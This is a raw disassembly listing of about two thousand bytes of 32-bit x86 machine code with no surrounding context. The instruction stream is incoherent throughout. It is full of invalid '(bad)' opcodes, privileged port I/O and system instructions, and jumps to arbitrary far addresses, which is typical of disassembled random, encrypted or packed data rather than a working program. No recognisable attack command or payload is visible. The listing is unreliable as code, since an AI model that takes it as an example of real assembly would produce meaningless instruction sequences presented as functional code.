  41054b:	sbb    BYTE PTR [edx+0x5f55aaab],bl
  410551:	sti    
  410552:	mov    edi,0x32ea366
  410557:	push   ecx
  410559:	idiv   DWORD PTR [ebx+0x42616716]
  41055f:	jns    0x41054c
  410561:	inc    ebp
  410562:	jno    0x4105cf
  410564:	pop    ebx
  410565:	enter  0x97d1,0x79
  410569:	xor    al,0x79
  41056b:	and    cl,BYTE PTR [ebx-0x35d76571]
  410571:	iret   
  410572:	sbb    bh,cl
  410574:	add    BYTE PTR [edx+0x2d],0xd2
  410578:	push   0x5d
  41057a:	sub    al,0x9
  41057c:	cld    
  41057d:	dec    ebp
  41057e:	pop    eax
  41057f:	xchg   ch,ch
  410581:	repz push ebx
  410583:	into   
  410584:	xor    BYTE PTR [ebx-0xfc95b05],bh
  41058a:	sahf   
  41058b:	sub    DWORD PTR [edi+0xcca2513],ecx
  410591:	mov    edi,0x2cbfa663
  410596:	xor    eax,0xdf0d47fa
  41059b:	repnz sub al,0xba
  41059e:	jb     0x410521
  4105a0:	mov    esi,0xbb2d09c6
  4105a5:	out    dx,al
  4105a6:	dec    edi
  4105a7:	mov    dl,0xb8
  4105a9:	arpl   WORD PTR [esi+eiz*2+0x23],si
  4105ad:	cwde   
  4105ae:	jmp    0x410558
  4105b0:	daa    
  4105b1:	inc    ebp
  4105b2:	out    0xda,eax
  4105b4:	ja     0x4105dd
  4105b6:	dec    eax
  4105b7:	jp     0x4105a5
  4105b9:	xchg   DWORD PTR [ebx+edx*8],eax
  4105bc:	pop    edx
  4105bd:	jno    0x410627
  4105bf:	jno    0x4105e8
  4105c1:	fist   DWORD PTR [edx-0x2b1a49b3]
  4105c7:	dec    edx
  4105c8:	and    ah,BYTE PTR [edx-0x55]
  4105cb:	into   
  4105cc:	inc    eax
  4105cd:	(bad)  
  4105ce:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4105cf:	test   al,0xe8
  4105d1:	out    dx,al
  4105d2:	ret    
  4105d3:	jne    0x410561
  4105d5:	fst    DWORD PTR [eax-0x38]
  4105d8:	and    al,0xc5
  4105da:	jno    0x41064d
  4105dc:	adc    ecx,DWORD PTR [esi-0x37]
  4105df:	xchg   BYTE PTR [esi],bh
  4105e1:	or     BYTE PTR [eax-0x51],cl
  4105e4:	out    0x6f,eax
  4105e6:	retf   0x4c8e
  4105e9:	jle    0x4105c0
  4105eb:	iret   
  4105ec:	or     al,BYTE PTR [eax]
  4105ee:	cmc    
  4105ef:	fild   DWORD PTR [ecx-0x11]
  4105f2:	jmp    0x512e8c1a
  4105f7:	fadd   st(2),st
  4105f9:	aaa    
  4105fa:	mov    fs,WORD PTR [esi+0x24]
  4105fd:	jmp    0x4105a1
  4105ff:	mov    cl,0x68
  410601:	add    dl,BYTE PTR ds:0x2e603672
  410607:	rcl    edi,0x2b
  41060a:	sar    BYTE PTR [ebx-0x44],0x6b
  41060e:	push   ds
  41060f:	(bad)  
  410610:	aas    
  410611:	sub    al,0xa
  410613:	ror    BYTE PTR [ebx-0x71],0x79
  410617:	nop
  410618:	xchg   ebp,eax
  410619:	pop    ebp
  41061a:	(bad)  
  41061b:	loop   0x4105b2
  41061d:	scas   al,BYTE PTR es:[edi]
  41061e:	mov    bh,0x8b
  410620:	imul   esp,esp,0xd2666251
  410626:	and    eax,0x196aeeae
  41062b:	jg     0x41066b
  41062d:	mov    ch,0x92
  41062f:	jnp    0x410615
  410631:	jg     0x410614
  410633:	fsubr  QWORD PTR fs:[eax]
  410636:	dec    esp
  410637:	popa   
  410638:	adc    DWORD PTR [edi+0x334e3c32],edx
  41063e:	stc    
  41063f:	ret    
  410640:	push   ebx
  410641:	adc    ecx,DWORD PTR [ebp+0x6eb286ed]
  410647:	loopne 0x4106a5
  410649:	xor    DWORD PTR [esi],edx
  41064b:	enter  0xac0c,0x46
  41064f:	adc    DWORD PTR [ecx],esi
  410651:	adc    dh,ch
  410653:	sub    DWORD PTR [esi],edx
  410655:	loop   0x410641
  410657:	dec    esi
  410658:	fst    QWORD PTR [eax]
  41065a:	or     ebp,edi
  41065c:	adc    eax,eax
  41065e:	aaa    
  41065f:	push   edx
  410660:	mov    fs:0x7dfb929a,eax
  410666:	fsubrp st(2),st
  410668:	xchg   ebx,eax
  410669:	hlt    
  41066a:	adc    eax,0xc1f13d85
  41066f:	and    eax,0xa4f187a5
  410674:	ins    DWORD PTR es:[edi],dx
  410675:	pop    ebp
  410676:	mov    ebx,0xff0ccce6
  41067b:	out    0x2c,eax
  41067d:	into   
  41067e:	xchg   edx,eax
  41067f:	in     al,0xe1
  410681:	add    bh,BYTE PTR [eax+0x608e12aa]
  410687:	aas    
  410688:	loopne 0x410667
  41068a:	or     DWORD PTR [ecx-0x21b6bb36],ebp
  410690:	aam    0x45
  410692:	xor    BYTE PTR [ecx-0x53cc51ae],al
  410698:	dec    eax
  410699:	push   esi
  41069a:	or     DWORD PTR [edx-0x36],esp
  41069d:	shl    BYTE PTR [edx-0x1a],cl
  4106a0:	lahf   
  4106a1:	xchg   esp,eax
  4106a2:	mov    esp,ds
  4106a4:	xor    ch,BYTE PTR [ebx-0x5fe69a8a]
  4106aa:	push   cs
  4106ab:	jmp    0xa190:0x52ea7773
  4106b2:	shl    DWORD PTR [edx-0x69],0x12
  4106b6:	nop
  4106b7:	test   al,0xd
  4106b9:	cmp    dh,bh
  4106bb:	pusha  
  4106bc:	das    
  4106bd:	(bad)  
  4106be:	adc    al,0x86
  4106c0:	es adc al,0x71
  4106c3:	jo     0x410728
  4106c5:	push   eax
  4106c6:	imul   eax,ebx,0xaa0737a5
  4106cc:	clc    
  4106cd:	or     al,0x40
  4106cf:	inc    ebp
  4106d0:	dec    esi
  4106d1:	fsqrt  
  4106d3:	(bad)  [edi-0x6bdeb5d0]
  4106d9:	daa    
  4106da:	cmp    ebp,DWORD PTR [ecx-0x531366b]
  4106e0:	cmp    eax,0x6750c697
  4106e5:	push   ebp
  4106e6:	xor    edi,eax
  4106e8:	aam    0xb8
  4106ea:	push   ss
  4106eb:	je     0x41072c
  4106ed:	cld    
  4106ee:	xchg   ecx,eax
  4106ef:	jmp    0x82fa:0xad1afbb6
  4106f6:	fild   QWORD PTR [edi+0x59]
  4106f9:	in     eax,0x6e
  4106fb:	inc    esp
  4106fc:	imul   ebx,DWORD PTR [edi+0x6d],0x70
  410700:	and    al,0x8c
  410702:	xchg   esp,eax
  410703:	push   esp
  410704:	ret    0xf499
  410707:	push   ds
  410708:	mov    si,0xf774
  41070c:	arpl   WORD PTR [ecx],si
  41070e:	cdq    
  41070f:	add    eax,0x47c73453
  410714:	jo     0x410780
  410716:	jmp    0x4106c2
  410718:	sbb    dh,BYTE PTR [edi+0x4e]
  41071b:	in     eax,0x7e
  41071d:	add    eax,0xa2d60a0d
  410722:	mov    al,gs:0x82ef6ca2
  410728:	adc    eax,DWORD PTR [ebx+0xc79508c]
  41072e:	jmp    0x960c:0x47e51324
  410735:	jecxz  0x410757
  410737:	xchg   edx,eax
  410738:	xlat   BYTE PTR ds:[ebx]
  410739:	arpl   WORD PTR [ebp+0x76d6ef65],sp
  41073f:	test   eax,0x4c6e2f57
  410745:	sti    
  410746:	sbb    esi,0xffffffa1
  410749:	sti    
  41074a:	pop    edi
  41074b:	icebp  
  41074c:	inc    edx
  41074d:	inc    ecx
  41074e:	shr    BYTE PTR [esi],cl
  410750:	hlt    
  410751:	jmp    0xb9aced69
  410756:	or     ebp,edx
  410758:	shr    edx,0x15
  41075b:	lahf   
  41075c:	mov    esi,DWORD PTR [eax+0x6a]
  41075f:	jmp    0x3a3c:0x5f5580d0
  410766:	cwde   
  410767:	shl    ecx,0x7b
  41076a:	xchg   DWORD PTR [ebp+0x6e],ebp
  41076d:	je     0x410744
  41076f:	shl    DWORD PTR [edi],0x50
  410772:	scas   al,BYTE PTR es:[edi]
  410773:	inc    ebp
  410774:	bound  ebp,QWORD PTR [edi+edi*8-0x61bf7929]
  41077b:	jp     0x4107f2
  41077d:	pop    ebp
  41077e:	adc    DWORD PTR [edx+0x3d981798],eax
  410784:	xor    eax,0xca628c83
  410789:	add    ebp,DWORD PTR [edx]
  41078b:	ficom  WORD PTR [ecx-0x276e54a4]
  410791:	je     0x410777
  410793:	mov    al,0xf3
  410795:	pop    edi
  410796:	jle    0x4107a0
  410798:	xrelease mov BYTE PTR [esi+0x6b53d402],al
  41079f:	and    ch,al
  4107a1:	out    0x52,eax
  4107a3:	fwait
  4107a4:	cmp    DWORD PTR [ebx],esi
  4107a6:	adc    ebx,DWORD PTR [esi]
  4107a8:	mov    BYTE PTR [ebx-0x2f],0x84
  4107ac:	jbe    0x4107bd
  4107ae:	cmp    BYTE PTR [ecx+0x1f37849],ah
  4107b4:	shl    DWORD PTR [ebx+eax*1-0x91469af],1
  4107bb:	jae    0x4107a9
  4107bd:	cmp    al,0x5c
  4107bf:	jl     0x410747
  4107c1:	ins    DWORD PTR es:[edi],dx
  4107c2:	shl    DWORD PTR [ebx+edx*1],1
  4107c5:	mov    ecx,0x6236cbc1
  4107ca:	fiadd  DWORD PTR [ebx-0x2d]
  4107cd:	nop    ebp
  4107d0:	fisubr DWORD PTR [edx-0x33]
  4107d3:	repz inc ebp
  4107d5:	xchg   ebp,eax
  4107d6:	mov    esi,0xf58a76dd
  4107db:	jno    0x410768
  4107dd:	jmp    0x7cc8:0xb64f7fef
  4107e4:	popa   
  4107e5:	test   bl,0xd4
  4107e8:	fs retf 
  4107ea:	sub    dh,ah
  4107ec:	mov    ch,BYTE PTR [eax-0x1fac23c3]
  4107f2:	retf   
  4107f3:	sbb    cl,BYTE PTR [edx-0x52ec873d]
  4107f9:	pop    esp
  4107fa:	aas    
  4107fb:	daa    
  4107fc:	adc    eax,0xfea6d18d
  410801:	pop    edx
  410802:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410803:	jnp    0x41080a
  410805:	inc    ebp
  410806:	jecxz  0x4107fb
  410808:	push   ecx
  410809:	mov    ebp,0xdbf55a5
  41080e:	and    esp,esi
  410810:	test   dh,dl
  410812:	mov    dl,0x5e
  410814:	cwde   
  410815:	cmp    eax,0xb457cca1
  41081a:	loop   0x4107bc
  41081c:	mov    edi,DWORD PTR ds:0x294ca481
  410822:	bound  ebp,QWORD PTR [edx+ebp*4+0x7829940e]
  410829:	jl     0x41089d
  41082b:	rol    BYTE PTR [edx-0x7d06a052],1
  410831:	sub    DWORD PTR [esi-0x43ad9e3],ebx
  410837:	mov    BYTE PTR ds:[ebx+0x73],al
  41083b:	xor    eax,0x8ac5ba87
  410840:	(bad)  
  410842:	sub    bl,ah
  410844:	loop   0x41089b
  410846:	dec    eax
  410847:	stc    
  410848:	test   al,0x4b
  41084a:	imul   edx,DWORD PTR [ecx-0x7c393922],0xffffffc2
  410851:	push   es
  410852:	mov    al,0x66
  410854:	jge    0x410829
  410856:	add    BYTE PTR cs:[edx+eax*1+0x3536fd93],0x67
  41085f:	inc    ebp
  410860:	jns    0x410829
  410862:	(bad)  
  410863:	sahf   
  410864:	xchg   edi,eax
  410865:	ret    
  410866:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410867:	fstp   DWORD PTR [edi]
  410869:	inc    ebp
  41086a:	mul    DWORD PTR [edi]
  41086c:	outs   dx,DWORD PTR ds:[esi]
  41086d:	add    al,ah
  41086f:	dec    ebx
  410870:	mov    dh,dl
  410872:	and    eax,0x7b182757
  410877:	adc    BYTE PTR [eax],al
  410879:	popa   
  41087a:	cmp    ebx,esp
  41087c:	jmp    0xe5e1:0x6958be2b
  410883:	aaa    
  410884:	stc    
  410885:	retf   
  410886:	call   0x3b54813a
  41088b:	cmp    eax,DWORD PTR [ecx]
  41088d:	and    dh,BYTE PTR [ebx+0x20578737]
  410893:	and    BYTE PTR [edx],dh
  410895:	mov    ebp,0xab141024
  41089a:	sbb    al,0xda
  41089c:	cmp    al,BYTE PTR [eax+0x6e]
  41089f:	loop   0x410886
  4108a1:	stos   BYTE PTR es:[edi],al
  4108a2:	cmp    eax,0x24ae1ee0
  4108a7:	jge    0x410886
  4108a9:	jns    0x410857
  4108ab:	into   
  4108ac:	push   ebx
  4108ad:	out    dx,al
  4108ae:	test   al,0x7b
  4108b0:	and    cl,BYTE PTR [eax-0x60e37dd1]
  4108b6:	cmp    esp,DWORD PTR [ecx]
  4108b8:	leave  
  4108b9:	inc    edx
  4108ba:	inc    ecx
  4108bb:	pop    ecx
  4108bc:	dec    ebp
  4108bd:	or     BYTE PTR [eax+0x2cdef313],ah
  4108c3:	das    
  4108c4:	lock xchg DWORD PTR [edx],ecx
  4108c7:	rcl    BYTE PTR [ecx+0x403d4c04],0xa5
  4108ce:	es repz test al,0x2d
  4108d2:	pop    edi
  4108d3:	popa   
  4108d4:	mov    edx,0x80d3ca94
  4108d9:	imul   esp,DWORD PTR [ebp+0x7c9618e9],0xc3849558
  4108e3:	fcomip st,st(6)
  4108e5:	fcomip st,st(1)
  4108e7:	xor    al,0x1d
  4108e9:	mov    bh,0xbe
  4108eb:	sub    al,0x49
  4108ed:	and    DWORD PTR [ecx],edi
  4108ef:	or     DWORD PTR [ebx+0x30],esi
  4108f2:	sub    BYTE PTR [eax+0x4f],bh
  4108f5:	out    0xb8,eax
  4108f7:	repnz (bad) 
  4108f9:	enter  0x22fa,0x8e
  4108fd:	mov    ebp,0xb168a097
  410902:	scas   eax,DWORD PTR es:[edi]
  410903:	into   
  410904:	fwait
  410905:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410906:	jg     0x4108ed
  410908:	sar    DWORD PTR [ebp-0x39],1
  41090b:	aas    
  41090c:	adc    eax,DWORD PTR [edx-0x15]
  41090f:	call   0x721d:0xfbb9a393
  410916:	lea    esp,[ecx-0x6a21ed63]
  41091c:	ror    eax,cl
  41091e:	sbb    al,0xe5
  410920:	cli    
  410921:	or     esp,DWORD PTR [ebx+0x756b2691]
  410927:	cmp    eax,0x34f4c081
  41092c:	jb     0x41091b
  41092e:	mov    dl,0x30
  410930:	fcomp  DWORD PTR [eax+esi*8]
  410933:	call   DWORD PTR [esi+0x7298264c]
  410939:	lods   ax,WORD PTR ds:[esi]
  41093b:	pop    ebp
  41093c:	mov    ds:0x347d2ad4,al
  410941:	shr    al,1
  410943:	cmc    
  410944:	xor    al,0x87
  410946:	dec    edi
  410947:	xlat   BYTE PTR ds:[ebx]
  410948:	pop    ds
  410949:	cmp    bl,ah
  41094b:	push   ds
  41094c:	jmp    0xd2af36fd
  410951:	push   ebp
  410952:	adc    edx,eax
  410954:	idiv   BYTE PTR [edi-0x54]
  410957:	sub    BYTE PTR [ebx],0x24
  41095a:	push   edi
  41095b:	test   al,dh
  41095d:	jmp    0x9210:0xba36b9a
  410964:	imul   esi,DWORD PTR [edx],0x71
  410967:	push   0xd9a962fd
  41096c:	mov    ebx,0x17692bc2
  410971:	push   es
  410972:	call   0x4c5c:0x8bb2a1b4
  410979:	and    eax,0x23a499ae
  41097e:	pop    esp
  41097f:	dec    ecx
  410980:	jecxz  0x4109dc
  410982:	stos   DWORD PTR es:[edi],eax
  410983:	or     BYTE PTR [esi+0x20],al
  410986:	aaa    
  410987:	and    DWORD PTR [edx],ecx
  410989:	test   BYTE PTR [ecx-0x28],ah
  41098c:	test   esp,esi
  41098e:	clc    
  41098f:	add    edi,DWORD PTR cs:[eax]
  410992:	pop    esp
  410993:	lahf   
  410994:	mov    esi,0x3d4eb293
  410999:	mov    al,0x4a
  41099b:	or     BYTE PTR [bx],dh
  41099e:	mov    edi,0xe3deec43
  4109a3:	push   edi
  4109a4:	dec    esp
  4109a5:	mov    ds,WORD PTR [esi]
  4109a7:	push   ecx
  4109a8:	xchg   DWORD PTR [edx],edi
  4109aa:	xchg   edi,eax
  4109ab:	xchg   edi,eax
  4109ac:	push   ebx
  4109ad:	loopne 0x4109a2
  4109af:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4109b0:	js     0x4109c5
  4109b2:	xchg   esi,eax
  4109b3:	pop    ecx
  4109b4:	lods   eax,DWORD PTR ds:[esi]
  4109b5:	adc    BYTE PTR [edx+0x5e4bcf64],bl
  4109bb:	push   esp
  4109bc:	pop    ebx
  4109bd:	pushf  
  4109be:	popf   
  4109bf:	imul   edi,edi,0x8abda18c
  4109c5:	mov    cl,0x6a
  4109c7:	sbb    al,0xeb
  4109c9:	shr    DWORD PTR [ebx],1
  4109cb:	pop    ds
  4109cc:	pop    ds
  4109cd:	(bad)  
  4109ce:	sbb    bl,BYTE PTR [edx-0x208717d0]
  4109d4:	push   edx
  4109d5:	mov    ecx,edx
  4109d7:	shl    DWORD PTR [ebx+ebx*8],1
  4109da:	add    dl,0xde
  4109dd:	mov    esp,0xecf0d1e0
  4109e2:	add    BYTE PTR [ebx+edx*4+0x6dc9d100],0xce
  4109ea:	test   eax,0xead92ec2
  4109ef:	icebp  
  4109f0:	sub    eax,0x878e367
  4109f5:	inc    edx
  4109f6:	test   al,0x9a
  4109f8:	inc    ebp
  4109f9:	adc    cl,BYTE PTR [esp+edi*1]
  4109fc:	and    eax,0x61421209
  410a01:	xchg   esi,eax
  410a02:	pop    ecx
  410a03:	sbb    eax,0x4276004c
  410a08:	mov    ebx,0xb50a4a4e
  410a0d:	xchg   ebp,eax
  410a0e:	sub    bl,BYTE PTR [ebx-0x22f9b91a]
  410a14:	mov    cl,cl
  410a16:	fldcw  WORD PTR [esi]
  410a18:	loopne 0x410a21
  410a1a:	inc    eax
  410a1b:	mov    ah,0x63
  410a1d:	dec    edi
  410a1e:	ins    BYTE PTR es:[edi],dx
  410a1f:	mov    edx,0xf69876c3
  410a24:	clc    
  410a25:	shl    DWORD PTR [ebx-0x4c3df6df],0x79
  410a2c:	repnz inc esp
  410a2e:	into   
  410a2f:	out    0xe4,eax
  410a31:	push   esi
  410a32:	retf   
  410a33:	fs sub BYTE PTR cs:[ecx-0x288ec943],bh
  410a3b:	and    DWORD PTR [esi+esi*2-0x9c4d8e7],esp
  410a42:	push   ecx
  410a43:	cs sub al,0x71
  410a46:	cli    
  410a47:	fs call 0x1592:0xc9e9bb57
  410a4f:	fidivr WORD PTR [edx-0x1b88c5eb]
  410a55:	adc    eax,0x572eb68f
  410a5a:	lds    edi,FWORD PTR [eax]
  410a5c:	int    0x59
  410a5e:	std    
  410a5f:	and    eax,0xcbf9710a
  410a64:	xor    eax,0xedf974d8
  410a69:	xor    al,0x72
  410a6b:	fisttp QWORD PTR [ecx]
  410a6d:	daa    
  410a6e:	pop    ebx
  410a6f:	(bad)  
  410a70:	dec    edi
  410a71:	(bad)  
  410a72:	pop    eax
  410a73:	ltr    WORD PTR [edi+0x52d9d8c9]
  410a7a:	dec    ebp
  410a7b:	push   ebx
  410a7c:	js     0x410a47
  410a7e:	xchg   esp,eax
  410a7f:	adc    eax,0xf90aef37
  410a84:	cmp    DWORD PTR [ebx],eax
  410a86:	fldenv [edi+edx*1-0x48]
  410a8a:	outs   dx,DWORD PTR ds:[esi]
  410a8b:	mov    esp,0x5d998c38
  410a90:	push   0xca6733c7
  410a95:	push   0x43
  410a97:	and    eax,0xacf16d9f
  410a9c:	fidiv  DWORD PTR ds:0xe70b262f
  410aa2:	js     0x410a44
  410aa4:	xor    eax,0x6d93ee30
  410aa9:	outs   dx,BYTE PTR ds:[esi]
  410aaa:	push   esp
  410aab:	and    eax,esi
  410aad:	push   es
  410aae:	fwait
  410aaf:	rcl    BYTE PTR ds:0xc96b3c96,1
  410ab5:	jmp    0x995a9d0d
  410aba:	je     0x410af5
  410abc:	push   ds
  410abd:	xchg   edi,eax
  410abe:	dec    ecx
  410abf:	stos   BYTE PTR es:[edi],al
  410ac0:	cwde   
  410ac1:	jg     0x410aed
  410ac3:	enter  0xbf21,0x3c
  410ac7:	bound  ebx,QWORD PTR [ebx]
  410ac9:	test   al,ah
  410acb:	mov    ecx,0x1677f7f7
  410ad0:	scas   eax,DWORD PTR es:[edi]
  410ad1:	sbb    BYTE PTR [ecx+0x18cc7e8d],0xc6
  410ad8:	pop    edi
  410ad9:	xlat   BYTE PTR ds:[ebx]
  410ada:	xor    al,0x76
  410adc:	fisubr WORD PTR [edx+ebx*4+0xe945d75]
  410ae3:	sub    BYTE PTR [edi-0x7d],al
  410ae6:	scas   eax,DWORD PTR es:[edi]
  410ae7:	(bad)  
  410ae8:	cdq    
  410ae9:	pop    ebx
  410aea:	and    DWORD PTR [ebp+0x6f],eax
  410aed:	push   ss
  410aee:	outs   dx,DWORD PTR ds:[esi]
  410aef:	add    dh,cl
  410af1:	push   0x664bf24a
  410af6:	mov    ecx,0x76bcee72
  410afb:	jno    0x410b48
  410afd:	push   es
  410afe:	mov    eax,0x4e5109d3
  410b03:	cmp    al,0x22
  410b05:	pop    edx
  410b06:	xchg   DWORD PTR [edi-0x61],eax
  410b09:	addr16 jle 0x410a95
  410b0c:	mov    cl,ah
  410b0e:	arpl   si,bx
  410b10:	jae    0x410b6e
  410b12:	ss in  al,dx
  410b14:	ror    ch,cl
  410b16:	jns    0x410aad
  410b18:	int3   
  410b19:	inc    edx
  410b1a:	cmp    dl,al
  410b1c:	jne    0x410ab1
  410b1e:	xor    ebx,DWORD PTR [ebx+0x5a42afdb]
  410b24:	call   0x6a4cbe52
  410b29:	out    dx,al
  410b2a:	jbe    0x410afb
  410b2c:	lock sbb DWORD PTR [esi+0x4c],esi
  410b30:	jle    0x410b58
  410b32:	dec    esp
  410b33:	or     BYTE PTR [esi-0x31],dl
  410b36:	and    DWORD PTR [ebp-0x58],ebx
  410b39:	dec    ebp
  410b3a:	cmp    bl,BYTE PTR [edi-0x6cecea14]
  410b40:	inc    esi
  410b41:	pop    ebp
  410b42:	add    eax,0xa9769ec4
  410b47:	arpl   bx,dx
  410b49:	push   ebx
  410b4a:	dec    ebp
  410b4b:	push   esp
  410b4c:	add    al,0xf6
  410b4e:	add    cl,dh
  410b50:	das    
  410b51:	sbb    dl,BYTE PTR [ebp-0x1e]
  410b54:	retf   
  410b55:	stos   BYTE PTR es:[edi],al
  410b56:	jbe    0x410b48
  410b58:	dec    edi
  410b59:	xchg   esi,eax
  410b5a:	mov    dh,0x95
  410b5c:	push   es
  410b5d:	xchg   ecx,eax
  410b5e:	xchg   DWORD PTR [edx+0x23923a82],ebp
  410b64:	in     al,dx
  410b65:	scas   eax,DWORD PTR es:[edi]
  410b66:	sub    BYTE PTR [edi-0x6ef03b69],bh
  410b6c:	sub    al,0x43
  410b6e:	aaa    
  410b6f:	sbb    edx,DWORD PTR [esi-0x80]
  410b72:	pop    es
  410b73:	pop    dx
  410b75:	iret   
  410b76:	aad    0x88
  410b78:	mov    ebx,0x8241555e
  410b7d:	push   ebp
  410b7e:	imul   eax,DWORD PTR [ebx-0x4b6ffcc8],0x8c108c4f
  410b88:	(bad)  
  410b8a:	(bad)  
  410b8c:	in     eax,0xf2
  410b8e:	xor    eax,0xc4ca30fc
  410b93:	retf   
  410b94:	and    ebp,DWORD PTR [ebp-0x4e]
  410b97:	mov    ah,0x72
  410b99:	or     al,0xf5
  410b9b:	pop    ecx
  410b9c:	pop    ecx
  410b9d:	or     al,0x8a
  410b9f:	cmp    al,0x47
  410ba1:	pop    edx
  410ba2:	retf   
  410ba3:	test   cl,0x58
  410ba6:	and    BYTE PTR [eax],al
  410ba8:	test   eax,0x19ffd088
  410bad:	sub    al,BYTE PTR [eax+0x382a6cb7]
  410bb3:	lea    edi,[edx+esi*8]
  410bb6:	dec    BYTE PTR [ecx-0x18]
  410bb9:	inc    edi
  410bba:	jg     0x410bc2
  410bbc:	dec    esp
  410bbd:	out    0x46,eax
  410bbf:	adc    dh,BYTE PTR [edi+esi*8-0x1fbffbc6]
  410bc6:	cmp    BYTE PTR [esi+ecx*1-0x109c15c8],cl
  410bcd:	xchg   bl,al
  410bcf:	fwait
  410bd0:	pop    ebp
  410bd1:	mov    bh,0x12
  410bd3:	cmp    DWORD PTR [edi],edx
  410bd5:	add    BYTE PTR [esi+eax*1-0x4a9e3f56],0x34
  410bdd:	or     cl,BYTE PTR [ebp-0x74]
  410be0:	stc    
  410be1:	ins    DWORD PTR es:[edi],dx
  410be2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410be3:	sub    dh,BYTE PTR [eax-0x35ee1597]
  410be9:	data16 jne 0x410bde
  410bec:	fbstp  TBYTE PTR [edx]
  410bee:	jae    0x410c47
  410bf0:	pop    es
  410bf1:	popf   
  410bf2:	cwde   
  410bf3:	mov    dh,0xc9
  410bf5:	int    0xc6
  410bf7:	sbb    al,0xa4
  410bf9:	imul   edx,DWORD PTR [edi],0xffffff87
  410bfc:	test   al,0x2d
  410bfe:	dec    ecx
  410bff:	rcr    BYTE PTR [edx-0x41],cl
  410c02:	rcr    DWORD PTR [esi+0x5],1
  410c05:	enter  0xf04,0x50
  410c09:	repz (bad) 
  410c0b:	leave  
  410c0c:	mov    ah,cl
  410c0e:	mov    dl,0x9d
  410c10:	js     0x410c90
  410c12:	stc    
  410c13:	cmc    
  410c14:	jo     0x410bf9
  410c16:	(bad)  
  410c18:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410c19:	mov    ?,WORD PTR [ebx-0x33]
  410c1c:	leave  
  410c1d:	jne    0x410c16
  410c1f:	je     0x410c13
  410c21:	or     bh,BYTE PTR [eax-0x209c3c9c]
  410c27:	scas   al,BYTE PTR es:[edi]
  410c28:	fild   QWORD PTR [eax-0x37645300]
  410c2e:	dec    ecx
  410c2f:	adc    dh,BYTE PTR [edx]
  410c31:	aam    0x4c
  410c33:	sbb    al,cl
  410c35:	fwait
  410c36:	repz sbb edx,DWORD PTR [edx+0x74]
  410c3a:	repnz and dh,BYTE PTR [esi]
  410c3d:	out    0x57,eax
  410c3f:	jbe    0x410c81
  410c41:	jge    0x410c15
  410c43:	jecxz  0x410c25
  410c45:	xchg   ebx,eax
  410c46:	aam    0xb3
  410c48:	dec    ebx
  410c49:	xchg   DWORD PTR [esi+0x520acf1e],esi
  410c4f:	(bad)  
  410c51:	push   eax
  410c52:	jg     0x410bdd
  410c54:	jae    0x410c47
  410c56:	aam    0xa5
  410c58:	or     dh,BYTE PTR [edi+0x5a22e59b]
  410c5e:	addr16 out 0x9e,eax
  410c61:	adc    DWORD PTR [ecx-0x37694698],ebx
  410c67:	fidiv  DWORD PTR [ecx+0x19]
  410c6a:	enter  0xbe0d,0x58
  410c6e:	mov    ebp,0xd5eef900
  410c73:	sbb    eax,0xa11ded29
  410c78:	lahf   
  410c79:	sub    ch,0x46
  410c7c:	jmp    0x410c7f
  410c7e:	jae    0x410cb9
  410c80:	mov    WORD PTR [eax],cs
  410c82:	cmp    al,0x71
  410c84:	push   ecx
  410c85:	pcmpgtd mm1,QWORD PTR [eax-0x5e]
  410c89:	aad    0x9
  410c8b:	iret   
  410c8c:	add    eax,0xa8a75ab
  410c91:	pusha  
  410c92:	adc    DWORD PTR [ecx],esi
  410c94:	(bad)  
  410c95:	sar    DWORD PTR [edx+edx*4],1
  410c98:	outs   dx,BYTE PTR ds:[esi]
  410c99:	and    al,0x5
  410c9b:	sub    al,0xf5
  410c9d:	(bad)  
  410c9e:	aam    0x89
  410ca0:	pop    ss
  410ca1:	imul   ebp,DWORD PTR [edx],0x15
  410ca4:	or     edi,DWORD PTR [eax]
  410ca6:	sahf   
  410ca7:	out    0x5a,eax
  410ca9:	js     0x410d26
  410cab:	mov    ch,0xef
  410cad:	ret    
  410cae:	inc    eax
  410caf:	fwait
  410cb0:	or     DWORD PTR [ebp-0xaf3de31],esi
  410cb6:	and    eax,0xf014a435
  410cbb:	stos   DWORD PTR es:[edi],eax
  410cbc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410cbd:	std    
  410cbe:	retf   
  410cbf:	dec    eax
  410cc0:	out    0x4,eax
  410cc2:	or     ah,BYTE PTR [ebx-0x45798fd7]
  410cc8:	loopne 0x410d41
  410cca:	xchg   ebx,eax
  410ccb:	mov    esp,0x1b13672f
  410cd0:	fisttp WORD PTR [ebx+0x6d]
  410cd3:	sbb    bl,dl
  410cd5:	add    al,0x3f
  410cd7:	sbb    BYTE PTR [eax+0x7d],al
  410cda:	pop    es
  410cdb:	or     edx,eax
  410cdd:	xlat   BYTE PTR ds:[ebx]
  410cde:	scas   al,BYTE PTR es:[edi]
  410cdf:	inc    ebx
  410ce0:	add    DWORD PTR [ebp-0x49b19447],ebx
  410ce6:	mov    ah,BYTE PTR ds:0xf57331e3
  410cec:	pop    ecx
  410ced:	mov    eax,0x906bf4f
  410cf2:	inc    ecx
  410cf3:	and    DWORD PTR [esi-0x48],0xe042a3e0
  410cfa:	push   ecx
  410cfb:	ins    DWORD PTR es:[edi],dx
  410cfc:	rcl    BYTE PTR cs:[esi-0x7c],cl
  410d00:	xor    dl,BYTE PTR [edi-0x48094ca2]
  410d06:	xchg   esi,eax
  410d07:	inc    esp
  410d08:	hlt    
  410d09:	les    eax,FWORD PTR [ecx-0x73a4b95]
  410d0f:	loop   0x410ccb
  410d11:	lahf   
  410d12:	stos   BYTE PTR es:[edi],al
  410d13:	sub    esp,DWORD PTR [ebx-0x606231c0]
  410d19:	aas    
  410d1a:	(bad)  
  410d1b:	in     eax,0x52
  410d1d:	sub    BYTE PTR [esi],0xb3
  410d20:	adc    eax,0xe0dd37a9
  410d25:	jo     0x410d8c
  410d27:	sub    al,0x68
  410d29:	and    DWORD PTR [ecx+eax*8],ecx
  410d2c:	xchg   edi,eax
  410d2d:	sbb    cl,BYTE PTR [edi]
  410d2f:	xor    al,0xf5
  410d31:	gs call 0xce54ac3a
  410d37:	jle    0x410db5
  410d39:	and    al,0x84
  410d3c:	jnp    0x410d20
  410d3e:	sub    esp,DWORD PTR [ebx-0x1829f3a1]
